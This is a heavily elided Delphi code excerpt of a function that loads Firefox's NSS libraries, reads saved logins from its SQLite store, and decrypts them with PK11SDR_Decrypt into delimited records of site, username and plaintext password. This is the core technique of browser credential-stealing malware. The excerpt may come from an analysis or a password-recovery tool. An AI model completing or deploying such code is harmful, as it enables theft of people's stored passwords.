...
function GetFFPass(sqlite3Dll: string; Delimiter: string): string;
...
begin
  ...
  LoadLibrary(pchar(FirefoxPath + 'msvcr100.dll'));
  LoadLibrary(pchar(FirefoxPath + 'msvcp100.dll')); 
  LoadLibrary(pchar(FirefoxPath + 'mozglue.dll'));
  LoadLibrary(pchar(FirefoxPath + 'mozcrt19.dll'));
  LoadLibrary(pchar(FirefoxPath + 'nss3.dll'));
      ...
      begin
        ...
        begin
          ...
          begin
            ...
            result := result +'FF' + Delimiter; //add resource tag
            Result := result + SQLIteTable.FieldAsString(SQLIteTable.FieldIndex['hostname']) + Delimiter; //add url 
            ...
            Result := result + DecryptedSECItem.SECItemData + Delimiter; //add username
            ...
            PK11SDR_Decrypt(@EncryptedSECItem, @DecryptedSECItem, nil);
            Result := result + DecryptedSECItem.SECItemData + Delimiter + '|'; //add password + end of record marker.
